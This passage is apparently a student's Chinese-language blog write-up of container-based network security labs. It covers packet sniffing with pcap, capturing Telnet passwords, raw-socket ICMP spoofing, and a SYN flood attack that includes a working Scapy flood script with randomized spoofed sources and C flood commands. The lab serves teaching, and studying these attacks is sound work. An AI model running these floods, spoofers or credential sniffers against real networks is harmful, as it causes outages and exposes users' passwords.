class="title">iph</span>;</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n===========Got a packet===========\n&quot;</span>);</span><br><span class="line">iph=(<span class="keyword">struct</span> ip*)(packet+<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ether_header));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Source Ip Address:&quot;</span>);</span><br><span class="line">print_ip((u_char*)&amp;(iph-&gt;ip_src));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Destination Ip address:&quot;</span>);</span><br><span class="line">print_ip((u_char *)&amp;(iph-&gt;ip_dst));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">pcap_t</span> *handle;</span><br><span class="line"><span class="type">char</span> errbuf[PCAP_ERRBUF_SIZE];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_program</span> <span class="title">fp</span>;</span></span><br><span class="line"><span class="type">char</span> filter_exp[] =<span class="string">&quot;icmp&quot;</span>;</span><br><span class="line">bpf_u_int32 net;</span><br><span class="line"><span class="comment">// Step 1: Open live pcap session on NIC with name eth3.</span></span><br><span class="line"><span class="comment">// Students need to change &quot;eth3&quot; to the name found on their own</span></span><br><span class="line"><span class="comment">// machines (using ifconfig). The interface to the 10.9.0.0/24</span></span><br><span class="line"><span class="comment">// network has a prefix &quot;br-&quot; (if the container setup is used).</span></span><br><span class="line">handle = pcap_open_live(<span class="string">&quot;br-12c77ce8b78a&quot;</span>, BUFSIZ, <span class="number">1</span>, <span class="number">1000</span>, errbuf);</span><br><span class="line"><span class="keyword">if</span>(handle==<span class="literal">NULL</span>)&#123;</span><br><span class="line">perror(<span class="string">&quot;error in pcap_open_live&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Step 2: Compile filter_exp into BPF psuedo-code</span></span><br><span class="line"><span class="comment">//编译过滤规则并设置</span></span><br><span class="line">pcap_compile(handle, &amp;fp, filter_exp, <span class="number">0</span>, net);</span><br><span class="line"><span class="keyword">if</span> (pcap_setfilter(handle, &amp;fp) !=<span class="number">0</span>) &#123;</span><br><span class="line">pcap_perror(handle, <span class="string">&quot;Error:&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Step 3: Capture packets</span></span><br><span class="line">pcap_loop(handle, <span class="number">-1</span>, got_packet, <span class="literal">NULL</span>);</span><br><span class="line">pcap_close(handle); <span class="comment">//Close the handle</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译<code>sniff.c</code>文件，</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -o sniff sniff.c -lpcap</span><br></pre></td></tr></table></figure><p><strong>回答问题：</strong></p><p><strong>问题1：请用自己的语言描述整个监听流程。</strong></p><p>首先使用<code>pcap_open_live</code>函数获得一个网络接口的handle；然后将BPF语言编译成机器可以读懂的代码，保存在fp中；然后使用<code>pcap_setfilter</code>函数应用过滤器fp，开始过滤数据包；最后使用<code>pcap_loop</code>函数一个一个处理接收到的数据包，所以这是一个loop循环（<code>-1</code> 表示无限次捕获数据包），每个数据包的详细处理过程在got_packet回调函数中；当loop结束之后使用<code>pcap_close</code>关闭handle，释放资源。</p><ul><li><p><code>pcap_open_live</code>：打开指定网卡设备</p></li><li><p><code>pcap_compile,pcap_setfilter</code>：编译BPF过滤条件并设置到本次处理；</p><ul><li><code>pcap_compile</code> 函数将过滤表达式 <code>icmp</code> 编译成 BPF 伪代码，并存储在 <code>fp</code> 结构中</li><li><code>pcap_setfilter</code> 设置过滤器，让 <code>pcap</code> 只捕获符合过滤条件（即 ICMP 数据包）的数据包。如果设置失败，输出错误信息并退出。</li></ul></li><li><p><code>pcap_loop</code>：开始循环捕获，通过回调函数对捕获到的每一个包进行处理</p></li><li><p><code>pcap_close</code>：关闭本次捕获</p></li></ul><p><strong>问题2：为什么执行该监听程序需要root权限？如果没有root权限，程序会运行到那一步失败？</strong></p><p>因为该程序需要访问网络设备（网卡），只有具有root权限的用户才能进行访问，非root用户无法访问。</p><p>如果没有root权限，那么程序应该会在访问网卡资源的步骤出错，也就是途中圈出的一步：</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-03 14.54.11.png" alt="截屏2025-01-03 14.54.11" style="zoom:25%;" /><p><strong>问题3：试着在监听程序中开启或者关闭网卡的混杂模式，可以证明网卡的混杂模式开与关下，程序的运行结果有什么不同吗？</strong></p><p>运行结果显然不同，</p><ul><li><p>混杂模式开启后能接收目的地址不是本机的数据包。用<code>10.9.0.1</code>的网卡设备作为嗅探设备，用hostA ping hostB，A和B在同一局域网，不会发给网关，<code>10.9.0.1</code>能收到ICMP的数据包。</p><blockquote><p>它可以使得enp0s3网卡开启混杂模式，使那些mac地址与enp0s3不匹配的数据包也将被enp0s3网卡接收。</p></blockquote></li></ul><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-03 14.56.49.png" alt="截屏2025-01-03 14.56.49" style="zoom:25%;" /><ul><li>修改<code>pcap_live_open</code>参数中的1为0，关闭混杂模式：<code>10.9.0.1</code>不能接收到hostA ping hostB的ICMP包，但是可以接收到出局域网的包。</li></ul><p>下述命令可以查看网卡接口的混杂模式是否开启，</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip -d <span class="built_in">link</span> show dev br-12c77ce8b78a</span><br></pre></td></tr></table></figure><p>关闭混杂模式如下，</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-03 14.55.42.png" alt="截屏2025-01-03 14.55.42" style="zoom:25%;" /><p>打开混杂模式如下，</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-03 14.55.52.png" alt="截屏2025-01-03 14.55.52" style="zoom:25%;" /><h4 id="2-2-1-2-Task2-1B-Writing-Filters"><a href="#2-2-1-2-Task2-1B-Writing-Filters" class="headerlink" title="2.2.1.2. Task2.1B Writing Filters"></a>2.2.1.2. Task2.1B Writing Filters</h4><p>本次task的目的是锻炼使用c程序对数据包进行过滤的功能。只需要对代码中的filter_exp的表达式进行修改即可，表达式使用的BPF语法。</p><p><strong>实验步骤：</strong></p><p>① 捕获两个特定主机之间的ICMP数据包</p><p>修改<code>filter_exp[]</code>为：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">filter_exp[]=<span class="string">&quot;icmp and host 10.9.0.5 and host 10.9.0.6&quot;</span></span><br></pre></td></tr></table></figure><p>只捕获<code>10.9.0.5</code>和<code>10.9.0.6</code>之间的，ping其他IP时则不会收到。</p><p>② 捕获目标端口在10-100之间的TCP数据包</p><p>修改配置如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">filter_exp[]=<span class="string">&quot;tcp and dst portrange 10-100&quot;</span></span><br></pre></td></tr></table></figure><p>编译，用curl对多个端口发起请求，只有10-100之间的才可以被捕获到</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl 10.9.0.6:portNo</span><br></pre></td></tr></table></figure><h4 id="2-2-1-3-Task2-1C-Sniffing-Passwords"><a href="#2-2-1-3-Task2-1C-Sniffing-Passwords" class="headerlink" title="2.2.1.3. Task2.1C Sniffing Passwords"></a>2.2.1.3. Task2.1C Sniffing Passwords</h4><p>嗅探TCP包中的敏感数据，以telnet为例：telnet远程连接，捕获其登录名和密码。</p><blockquote><p>什么是Telnet服务？</p><p>Telnet（Telecommunication Network）是一种用于远程登录到计算机或其他设备的网络协议。基于CS模型，其中Client端就是连接到远程计算机的用户，Server端是运行Telnet服务的远程计算机。但是Telnet协议在传输数据包时是明文的，这会导致用户的登录信息和传输数据被窃听，由于安全性考虑，现代网络通信更倾向于使用SSH代替Telnet。</p></blockquote><p>Telnet的数据包传输过程：</p><ol><li>建立连接：Telnet客户端通过**<u><em>TCP</em></u>**连接（默认端口23）与Telnet服务器建立连接。</li><li>协商选项：TCP连接建立之后，客户端和服务器之间开始进行选项协商，确定一些通信参数，如字符集、终端类型等。</li><li>用户认证：Telnet服务器现需要对用户进行身份验证，通常通过用户名和密码。（本次task就是要从用户认证的数据包中窃取登录的密码）</li><li>数据传输：用户在Telnet客户端输入的命令和其他数据被封装成Telnet数据包，通过TCP连接发送到Telnet服务器。</li><li>执行命令：Telnet服务器接收到数据包后，解析命令并执行相应的操作。执行结果被封装成数据包，通过TCP连接返回到客户端。</li><li>断开连接：关闭TCP连接，释放资源，终止通信。</li></ol><p><strong>实验步骤：</strong></p><p>编写task2-1-c.c代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">见代码源文件</span><br></pre></td></tr></table></figure><p>①  修改过滤表达式：使得程序可以过滤除telnet服务之外的数据包。</p><p><code>filter_exp[] = &quot;tcp port 23&quot;;//实际的过滤规则</code></p><p>这不仅会捕获从客户端到服务端的数据包，还可以捕获服务端到数据端的数据包。</p><p>②  修改回调函数<code>got_packet()</code>，使其能够打印Telnet payload（TCP payload）的内容。</p><p>③  编译运行，复制到attacker container中运行，同时在HostA container中使用telnt连接HostB，发现attacker可以成功嗅探到密码。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -o sniff sniff.c -lpcap</span><br><span class="line">docker <span class="built_in">cp</span> sniff 73cc05af315d:/tmp</span><br></pre></td></tr></table></figure><p>得到用户名和密码，为<code>seed-dees</code>，由此可见，成功从数据包中窃取到用户名和密码，并且还能实时监控HostA与HostB的所有Telnet操作，</p><p><strong>分析：</strong></p><p>能抓取成功的主要原因就是：可以窃听到其他主机的通信，Telnet数据包通信采用明文形式。所以只需要取出TCP payload即可。</p><p>通过数据包分析，Telnet客户端会把用户输入的每个字符都单独发送给服务器，并且服务器每次收一个数据包之后还要有回应确认该数据包已经收到（Telnet默认的工作方式）。所以用户输入的用户名和密码都以一个字符一个数据包的形式发送。</p><p>所以Telnet通信是不安全的，最好还是使用SSH。</p><h3 id="2-2-2-Task2-2-Spoofing"><a href="#2-2-2-Task2-2-Spoofing" class="headerlink" title="2.2.2. Task2.2 Spoofing"></a>2.2.2. Task2.2 Spoofing</h3><p>操作系统通常不允许普通用户直接操作数据包的头部字段，只允许普通用户设置目的IP地址目的端口等。但是，如果有ROOT权限的用户，他们可以通过原始套接字来自定义任意字段，以实现数据包欺骗（Spoofing）。</p><p>**<u>原始套接字</u>**为程序员提供了对数据包构造的绝对控制，允许程序员构造任何任意数据包，包括设置头字段和有效载荷。使用原始套接字有以下四个步骤：</p><ol><li>创建一个原始套接字，</li><li>设置套接字选项，</li><li>构造数据包，</li><li>通过原始套接字发送数据包。</li></ol><h4 id="2-2-2-1-Task2-2A-Write-a-spoofing-program"><a href="#2-2-2-1-Task2-2A-Write-a-spoofing-program" class="headerlink" title="2.2.2.1. Task2.2A Write a spoofing program"></a>2.2.2.1. Task2.2A Write a spoofing program</h4><p>本次task的目标是编写一个可以发送欺骗数据包的C程序。</p><p><strong>实验步骤：</strong></p><p>在本次实验中，我将构造一个虚拟的ICMP echo request数据包，源IP为8.8.8.8，目的IP为10.9.0.5 (HostA)。如果欺骗成功，HostA应该返回一个ICMP echo reply数据包。</p><p>首先自定义报头结构体，根据需要指定字段内容：根据wireshark抓包可得，除了IP和ICMP的报文头，还有8个字节的时间戳和48个字节的填充数据，并且使用原始套接字，<strong>根据数据包中的源IP构造对应的sockaddr_in</strong>，发送自定义IP数据包，</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">见代码源文件</span><br></pre></td></tr></table></figure><p>编译运行，</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -o spoof spoof.c -lpcap</span><br></pre></td></tr></table></figure><p>尝试发送虚假的TCP、UDP数据包（源IP地址为8.8.8.8），同时也发现HostA也对其做了响应；从wireshark的抓包结果可以看出，HostA回应了我们发送的Spoofing数据包（由TTL值可知确实是我们构造发送的TTL&#x3D;100的数据包），证明Spoof程序是成功的，</p><p><u>注意</u>：当源IP地址为<code>10.9.0.99</code>时，只会截获一个<code>ICMP</code>数据包，即hostA返回响应的数据包不会被网关截获（因为两个IP在同一个局域网内，发送的数据包不会经过网关而直接发送到目标主机，也就是说不会被wireshark所截获），所以只显示一个数据包。</p><blockquote><p>通过原始套接字发送 ICMP 请求数据包。原始套接字绕过操作系统的标准网络栈，直接将数据包发送到网络接口（网卡），因此会直接进入目标主机 <code>10.9.0.5</code>。</p><p>然而，由于目标主机和源主机在同一个子网，它们之间的通信不通过路由器或网关，这意味着返回的 ICMP 响应包也会直接从目标主机 <code>10.9.0.5</code> 发送到源主机 <code>10.9.0.99</code>，而不是经过网关。因此，这些返回的包不会经过 Wireshark 监听的网络接口（除非 Wireshark 直接在源主机或目标主机上运行）。</p></blockquote><h4 id="2-2-2-2-Task2-2B-Spoofing-and-ICMP-Echo-Request"><a href="#2-2-2-2-Task2-2B-Spoofing-and-ICMP-Echo-Request" class="headerlink" title="2.2.2.2. Task2.2B Spoofing and ICMP Echo Request"></a>2.2.2.2. Task2.2B Spoofing and ICMP Echo Request</h4><p>本次task的目标是伪造ICMP Echo Request数据包。</p><p>在本次实验中，代表HostA伪造ICMP echo Request数据包，即使用HostA的IP地址(10.9.0.5)作为其源IP地址，将该数据包发送至Internet上的活跃的计算机，同时打开wireshark抓包，如果欺骗成功了，应该可以收到Internet上主机的回复。</p><p><strong>实验步骤：</strong></p><p>在2.2.2.1代码的基础上，修改代码。编译执行spoof，同时打开wireshark抓包。成功收到来自Internet上活跃主机8.8.8.8的<code>ICMP echo reply</code>数据包，证明8.8.8.8被程序发送的数据包给欺骗了，</p><p>如果以局域网中不存在的主机（10.9.0.25）为源IP向某存活主机发起request，由于源IP是不可达的，所以无法收到存活主机的reply。</p><p><strong>回答问题：</strong></p><p><strong>问题4：可以将IP数据包的长度字段设为任意值，不管实际数据包有多大？</strong></p><p>不可以，IP 数据包长度字段必须准确地表示整个数据包的长度，包括头部和数据。这个字段的大小是由协议定义的，如果设置了不正确的长度，可能会导致数据传输错误或丢包。</p><p>即<u>可以随意设置IP报文头部的长度</u>，但必须保证向socket发送的原始报文是正确的长度。</p><p><strong>问题5：在使用raw socket编程时，是否要计算IP头部的校验和？</strong></p><p>必须要计算校验和，若校验不通过则该数据包会被丢弃。</p><p>在我们的程序中，我们计算了ICMP header中的校验和；但是对于IP header的校验和，程序中却没有显示计算，这是因为对于IP header，通常不需要手动计算校验和，应为在使用sendto函数发送数据包的时候，操作系统会检测到IP头的校验和字段是空的，会自动计算正确的校验和。</p><p>这种自动校验和计算是现代网络栈的一个特性，旨在简化原始套接字的使用，因此在许多情况下，直接使用原始套接字发送 IP 数据包无需担心 IP 头的校验和计算。</p><p><strong>问题6：为什么使用raw socket的程序需要root权限？如果没有root权限，程序会在哪里执行失败？</strong></p><p>创建原始套接字需要root权限；若没有权限，<code> socket(AF_INET, SOCK_RAW, IPPROTO_RAW);</code>这一步就无法成功创建套接字；</p><p>raw socket允许直接访问底层网络协议，这意味着可以构造或拦截低层次的网络通信包。由于这种能力可能被滥用，造成安全问题，所以只有具有root权限的用户才能创建和使用raw socket。如果没有root权限执行这样的程序，通常在尝试创建raw socket时就会失败。</p><h3 id="2-2-3-Task-2-3-Sniff-and-then-Spoof"><a href="#2-2-3-Task-2-3-Sniff-and-then-Spoof" class="headerlink" title="2.2.3. Task 2.3 Sniff and then Spoof"></a>2.2.3. Task 2.3 Sniff and then Spoof</h3><p>本次task的目的是将前面的Sniff和Spoof功能结合，实现一个Sniff-and-then-Spoof程序。</p><p><u>本次的实验要求如下：</u></p><p>本次实验需要在同一个LAN下的两个主机，在主机A上ping某个IP，会生成ICMP echo request数据包，如果这个IP是存活的，那么主机A上的ping程序就会收到echo reply，并且打印出这些消息。</p><p>我们将sniff-and-then-spoof程序（snsp）运行在攻击者的机器上（可以嗅探到LAN下的数据包），每当程序捕获到ICMP echo request，无论目标地址是多少，程序都会立即发送虚假的echo reply，告诉主机A，此IP是存活的。</p><p><strong>实验步骤：</strong></p><p>编写sniff_spoof_icmp.c程序，将上面实验中的sniff和spoof功能结合，</p><blockquote><p>值得注意的是：需要从原IP数据包中的源、目的IP取出，作为spoofing数据包的目的、源IP地址。</p><p>首先，在main函数中完成设置过滤、创建原始套接字功能，并通过参数的形式将原始套接字传递给回调函数，在回调函数中发送spoofing数据包。</p><p>在回调函数中，先接收原始套接字，然后通过自定义函数send_echo_reply()发送欺骗数据包。</p><p>在send_echo_reply()函数中，我们先获取原始的IP数据包，便于待会儿提取源、目的IP地址。然后构造ICMP echo reply数据包，再构造IP数据包（这里我们将TTL设为111便于检验），最后将构造好的数据包发送。</p><p>python的scapy包：tcp有端口参数，ip有ttl参数。</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">见代码源文件</span><br></pre></td></tr></table></figure><p>编译，然后将得到的程序放在attacker container中运行，同时使用hostA ping 123.123.123.123（一个无法ping通的主机），</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -o snsp snsp.c -lpcap</span><br><span class="line">docker <span class="built_in">cp</span> snsp 73cc05af315d:/tmp</span><br></pre></td></tr></table></figure><p>结果如下所示，首先在attack container容器内打开snsp监听，然后在hostA内ping一个未知的IP，wireshark抓包结果如下所示，可以看到数据包的TTL是111，验证了确实是我们构造发出的数据包，</p><p>虽然123.123.123.123主机无法ping通，但是由于snsp程序的运行，使得hostA有了回应，</p><h2 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h2><ul><li><p>用C语言构造报文头比python难很多，但是可操作性更强，可自定义每一个字节的数据；</p><ul><li><p><strong>易用性</strong>：Python 的库（如 Scapy）使得数据包的创建和操作变得非常简单，代码可读性强，易于调试。相比之下，C 语言需要手动处理更多底层细节，比如内存管理和指针操作，这使得代码更复杂。</p></li><li><p><strong>开发效率</strong>：Python 的高层次抽象可以快速构建和测试数据包，而 C 语言通常需要更多的时间来设置数据结构和编写处理逻辑。对于快速原型开发，Python 更加高效。</p></li><li><p><strong>性能</strong>：虽然 Python 在开发效率上占优势，但在性能方面，C 语言通常表现更好，尤其是在处理高流量数据包时，C 的执行速度明显更快。这对于需要实时处理的网络应用来说是一个重要的考虑因素。</p></li><li><p><strong>调试工具</strong>：在 Python 中，有许多现成的调试工具和框架可以帮助快速定位问题。而在 C 语言中，调试过程可能需要使用更底层的工具，如 gdb，这对于初学者来说可能会增加学习成本。</p><p>总的来说，Python 更适合于快速开发和实验，而 C 语言则在性能和底层控制上更具优势。</p></li></ul></li><li><p>接发包不只是要构造源和目的的地址，对于操作系统和特定程序来说，都有其必要的检验机制，如本次实验中ping检验了Raw数据。</p></li></ul><h1 id="Lab10-TCP攻击实验"><a href="#Lab10-TCP攻击实验" class="headerlink" title="Lab10-TCP攻击实验"></a>Lab10-TCP攻击实验</h1><blockquote><p>ip tcp_metrics flush刷新掉已经保留的连接。</p><p>sysctl -w net.ipv4.tcp_ max_syn_backlog&#x3D;80调小队列的大小。</p><p>C语言来实现快速发包</p><p>开启SYN cookie保护机制之后，再次运行攻击，发现flood攻击不再有效</p><p>flag&#x3D;’R’，RESET位置为1表示RST包发送成功</p><p>自动获取：sniff函数嗅探网络数据包</p><p>TCP会话劫持攻击：数据部分</p><p>TCP会话劫持创建反向shell</p></blockquote><h2 id="2-1-Task1-SYN-Flooding-Attack"><a href="#2-1-Task1-SYN-Flooding-Attack" class="headerlink" title="2.1. Task1. SYN Flooding Attack"></a>2.1. Task1. SYN Flooding Attack</h2><blockquote><p>SYN攻击（SYN Flood Attack）是一种利用TCP协议漏洞的网络攻击方式，旨在消耗目标系统的资源，导致服务不可用。攻击者发送大量伪造的TCP连接请求（称为SYN包），但不完成握手过程，也不响应服务器的确认请求，从而使得服务器在等待确认时耗尽资源，无法处理合法请求。</p></blockquote><p>攻击者发送的大量恶意的SYN请求会导致服务器的<strong>半连接队列</strong>（半连接，完成了SYN、SYN-ACK的但是没有进行ACK back的TCP连接）溢出，<strong>因为服务器会为每个收到的SYN请求保留一定的资源直到完成连接或超时</strong>。一旦**<u><em>服务器的半连接队列</em></u>**被填满，合法用户的连接请求将无法得到响应，导致拒绝服务（DoS）状态，使得服务器无法提供正常服务。</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-03 15.52.26.png" alt="截屏2025-01-03 15.52.26" style="zoom:25%;" /><p>在 Linux 系统中，可以通过修改<code>/proc/sys/net/ipv-/tcp_max_syn_backlog </code>或者使用 <code>sysctl </code>命令来设置TCP连接的最大半连接数，</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sysctl net.ipv4.tcp_max_syn_backlog</span><br></pre></td></tr></table></figure><p>还可以使用<code>netstat -nat</code>命令来查看队列的适用情况。半连接的状态为<code>SYN-RECV</code>，而成功完成三次握手的连接的状态为<code>ESTABLEISHED</code>，</p><p>为了防范SYN攻击，一种常见的方法是使用SYN cookies，SYN cookies允许服务器在没有建立完整连接时，<strong>不必维护连接状态</strong>，从而减轻了服务器负担，防止了资源耗尽。</p><h3 id="2-1-1-Task1-1-Launching-the-Attack-Using-Python"><a href="#2-1-1-Task1-1-Launching-the-Attack-Using-Python" class="headerlink" title="2.1.1. Task1.1 Launching the Attack Using Python"></a>2.1.1. Task1.1 Launching the Attack Using Python</h3><p>使用python语言实现SYN Flooding攻击。并尝试使用另一台container通过telnet连接victim container，查看是否能够连接成功。如果失败了，请思考失败的原因。</p><p><strong>实验步骤：</strong></p><p>编写synflood.py程序，</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ipaddress <span class="keyword">import</span> IPv4Address</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"></span><br><span class="line">ip=IP(dst=<span class="string">&#x27;10.9.0.5&#x27;</span>)</span><br><span class="line">tcp=TCP(dport=<span class="number">23</span>,flags=<span class="string">&#x27;S&#x27;</span>)</span><br><span class="line">pkt=ip/tcp</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">pkt[IP].src=<span class="built_in">str</span>(IPv4Address(getrandbits(<span class="number">32</span>)))</span><br><span class="line">pkt[TCP].sport = getrandbits(<span class="number">16</span>)</span><br><span class="line">pkt[TCP].seq = getrandbits(<span class="number">32</span>)</span><br><span class="line">send(pkt, verbose = <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>运行程序，进入victim-docker查看10.9.0.5的网络连接状态，</p><p>从上图中已经可以看到，在Victim中，已经有很多状态为SYN_RECV的TCP连接了，表明SYN攻击已经奏效。</p><p>但是我们通过<code>netstat -nat | grep SYN_RECV | wc -l</code>命令查看当前半连接的数量，发现其数量稳定在128左右，小于系统设置的tcp半连接队列的容量192&#x3D;256*（3&#x2F;4），所以此时victim还是可以与其他用于进行正常的tcp连接的，使用user1 container（10.9.0.6）仍然可以成功连接到victim container；只是比起没有SYN flood攻击的时候，连接会慢一点，</p><p>所以，这样虽然SYN Flooding攻击表面上成功了，但是并没有达到我们预想的效果：使得victim的TCP连接拒绝服务。</p><p>**注意：**只稍微等了一下，就连接上了。而我们之后再次连接，都是瞬间连接上。</p><p>第一次是因为，python 程序跑得不够快，其它用户总有机会抢过它。而之后能立即连接是因为，受害者主机记住了原来的连接，详细分析如下：</p><p><strong>附</strong>：</p><p>修改<code>net.ipv4.tcp_max_syn_backlog</code>的值</p><p>队列中可以存储多少个半连接会影响攻击的成功率。通过以下命令将设置半开放连接队列的容量改为80，</p><p>虽然队列的容量为80，但是有四分之一的空间是用于proven destinations（通过验证的目的地）的连接（当SYN Cookies被关闭的情况下），所以实际的容量只有60左右，</p><p>查看SYN cookie的命令如下，</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sysctl -a | grep syncookies</span><br></pre></td></tr></table></figure><p>查看队列中有多少项，</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netstat -tna | grep SYN_RECV | <span class="built_in">wc</span> -l</span><br><span class="line">ss -n state syn-recv sport = :23 | <span class="built_in">wc</span> -l</span><br></pre></td></tr></table></figure><p>注意：如果禁用了SYN Cookies，TCP会为“已验证的目标”保留四分之一的后备队列。确保对于已经建立连接的目标，系统有足够的资源来处理它们的连接请求，而不会因为队列满了而拒绝连接。所以，在每次尝试连接victim的之前，都需要执行<code>ip tcp_metrics flush</code>命令清空TCP连接信息。</p><p><strong>解决办法：</strong></p><p><strong>方法一</strong>：<u>并行运行py程序</u></p><p><code>net.ipv4.tcp_synack_retries</code>默认值为5，即victim发送SYN+ACK数据包后，将等待ACK数据包，如果它没有及时到达，那么TCP将重新发送5次SYN+ACK数据包，如果这5次重发之后都没有回应，那么操作系统就会把这个TCP半连接从半连接队列里面剔除；每当一个TCP半连接被剔除，就有一个位置空了出来，用于攻击的SYN数据包就会和合法的telnet数据包竞争。python数据包如果不够快（发送的频率没有telnet数据包高），那么telnet数据包就会赢得此空位，成功建立TCP连接，</p><p>可以通过并行py程序，使得有空位的时候，存在多个SYN数据包与合法的telnet数据包竞争，那么telnet数据包竞争成功的可能性就会减小，成功建立TCP连接的可能性就会减小，尝试开<strong>5个</strong>终端同时运行py程序。这时，使用user1 container对victim进行telnet连接的等待时间就很长了，但是还是可以成功，应该是在和很多SYN数据包“抢”空位，</p><p>当并行运行<strong>6个</strong>py程序的时候，成功率就比较低了，并行运行的py程序越多，排队抢“空位”的SYN数据包也就更多，合法用户建立tcp连接的成功率就越低，</p><p>打开<u>7个</u>终端并发执行python代码的时候，结果如下，一等待时间明显超过一分钟，最终出现超时的错误提示，</p><p><strong>方法二</strong>：<u>修改受害者的配置文件</u></p><p>查看受害者的tcp重传阈值，</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sysctl net.ipv4.tcp_synack_retries</span><br></pre></td></tr></table></figure><p>改进1：提高受害者的tcp重传阈值</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sysctl -w net.ipv4.tcp_synack_retries=10</span><br></pre></td></tr></table></figure><p>改进2：减小队列中能容纳的syn包的数量</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sysctl -w net.ipv4.tcp_max_syn_backlog=80</span><br></pre></td></tr></table></figure><p>在容器中清除受害者与攻击者的成功连接记录：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip tcp_metrics show</span><br><span class="line">ip tcp_metrics flush</span><br></pre></td></tr></table></figure><p>再次发起攻击，等待一分钟后尝试登录，无法连接成功，一直卡在如下登入界面，最后等待超时，出现如下结果，攻击成功，10.9.0.6使用telnet来连接10.9.0.5失败，完成了SYN flood攻击，</p><p>查看受害者的队列中有多少个半连接：(前面设置的队列大小的四分之三用于存放半连接，三分之一用来存放已成功连接，因此有效容量为80*3&#x2F;4&#x3D;60)</p><img src="https://raw.githubusercontent.com/Hozenghan/blogsResources/master/images/截屏2025-01-03 16.00.58.png" alt="截屏2025-01-03 16.00.58" style="zoom:50%;" /><h3 id="2-1-2-Task1-2-Launching-the-Attack-Using-C"><a href="#2-1-2-Task1-2-Launching-the-Attack-Using-C" class="headerlink" title="2.1.2. Task1.2 Launching the Attack Using C"></a>2.1.2. Task1.2 Launching the Attack Using C</h3><p>使用py程序发送数据包的速度很慢，这导致了SYN数据包很难能够竞争过telnet发送的数据包，所以即使py程序成功执行了SYN flooding，有时也无法达到想要的效果。</p><p>但是通过C代码发送数据包的速度（效率）要比通过py发送快得多。这样一来，SYN数据包与telent数据包的竞争，telnet就很难取胜，使得合法的telnet连接超时。</p><p><strong>实验步骤：</strong></p><p>记得换源task1.1中修改的docker配置，将受害者的相关参数恢复为修改前。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sysctl -w net.ipv4.tcp_synack_retries=5</span><br><span class="line">sysctl -w net.ipv4.tcp_max_syn_backlog=256</span><br></pre></td></tr></table></figure><p>编译C语言代码并运行，</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc synflood.c -o synflood</span><br><span class="line"><span class="built_in">sudo</span> ./synflood 10.9.0.5 23</span><br></pre></td></tr></table></figure><p>等待一分钟后尝试telnet连接受害者，无法成功登录，然后在victim container中查看半连接数量维持在128左右</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netstat -tna | grep SYN_RECV | <span class="built_in">wc</span> -l</span><br></pre></td></tr></table></figure><p>尝试使用10.9.0.6来telnet连接10.9.0.5，会发现连接失败，出现超时，结果如下，</p><p><strong>发现</strong></p><p>只需要一个c程序就可以使得半连接数量稳定在128（系统资源能够处理的最大值），应该是因为c程序发送的数据包的效率很高，两个数据包之间的时间间隔很小，即使操作系统处理处理完某一个半连接，新的SYN数据包马上就补上了空位，而py程序发送的数据包效率比较低，所以导致有时空位补不上的情况，进而半连接数量不稳定，无法达到拒绝服务的效果。</p><p>若修改<code>sysctl -w net.ipv4.tcp_max_syn_backlog=128</code>，运行C语言代码后可以查看半连接数量为<code>97&gt;(128*0.75=96)</code>，轻松超过阈值，实现SYN洪泛攻击，</p><p>与先前<code>sysctl -w net.ipv4.tcp_max_syn_backlog=256</code>时一致，使用user1 container对victim进行telnet连接，需要等待很长的时间，很容易出现超时的情况，无法成功建立TCP连接，</p><h3 